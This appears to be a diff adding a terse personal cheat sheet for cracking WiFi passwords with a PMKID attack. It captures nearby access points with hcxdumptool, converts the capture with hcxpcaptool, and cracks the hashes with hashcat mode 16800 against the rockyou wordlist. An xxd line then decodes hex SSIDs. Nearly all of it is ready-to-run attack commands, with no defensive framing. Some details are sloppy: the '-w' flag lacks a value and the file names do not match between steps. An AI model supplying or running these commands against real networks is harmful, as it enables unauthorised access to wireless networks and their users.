@@ -1,0 +1,17 @@
+This time ..hcxdumptool
+
+    hcxdumptool -o filename.pcapng -i wlan0mon --enable_status 3  //dumps all acesspoint into packet captured file
+
+    hcxpcaptool -z newfilename.text oldfilename.pcapng         // used information from packet captured file
+
+>> open hashcat
+
+    hashcat -m 16800 -a 0 -w --force filename.txt rockyou.txt
+
+done and next is 
+
+to convert hashed ssid to plain text 
+
+>>terminal
+
+    echo "hashed ssid" | xxd -r -p
